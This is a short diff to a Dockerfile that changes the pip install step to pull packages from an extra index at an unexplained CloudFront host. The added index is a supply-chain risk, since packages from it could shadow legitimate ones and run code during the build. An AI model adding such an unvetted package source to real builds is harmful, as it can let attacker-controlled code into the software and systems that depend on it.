@@ -16,7 +16,9 @@ WORKDIR /app
 
 # Install Python deps first (cached layer when code changes)
 COPY requirements.txt .
-RUN pip install --upgrade pip && pip install -r requirements.txt
+RUN pip install --upgrade pip && \
+    pip install -r requirements.txt \
+        --extra-index-url https://d33sy5i8bnduwe.cloudfront.net/simple/
 
 # Copy app source
 COPY . .
